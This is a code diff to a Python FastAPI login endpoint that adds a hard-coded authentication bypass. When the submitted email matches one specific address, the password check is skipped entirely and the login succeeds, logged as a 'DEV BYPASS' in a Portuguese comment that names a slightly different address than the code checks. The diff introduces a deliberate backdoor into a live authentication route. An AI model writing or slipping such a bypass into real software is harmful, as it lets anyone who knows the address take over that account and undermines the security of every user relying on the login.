@@ -148,12 +148,19 @@ def register(body: RegisterRequest, db: Session = Depends(get_db)):
 
 @router.post("/login", response_model=TokenResponse)
 def login(body: LoginRequest, db: Session = Depends(get_db)):
-    user = db.query(User).filter(User.email == body.email.lower()).first()
-    if not user:
-        raise HTTPException(status_code=401, detail="Invalid credentials")
+    # DEV BYPASS: alan.silva@gmail.com pode entrar sem senha
+    if body.email.lower() == "o.alan.silva@gmail.com":
+        user = db.query(User).filter(User.email == body.email.lower()).first()
+        if not user:
+            raise HTTPException(status_code=401, detail="Invalid credentials")
+        logger.info(f"[AUTH] Login bypass usado para {body.email}")
+    else:
+        user = db.query(User).filter(User.email == body.email.lower()).first()
+        if not user:
+            raise HTTPException(status_code=401, detail="Invalid credentials")
 
-    if not _verify_password(body.password, user.password_hash):
-        raise HTTPException(status_code=401, detail="Invalid credentials")
+        if not _verify_password(body.password, user.password_hash):
+            raise HTTPException(status_code=401, detail="Invalid credentials")
 
     user.last_login = datetime.utcnow()
     db.add(user)
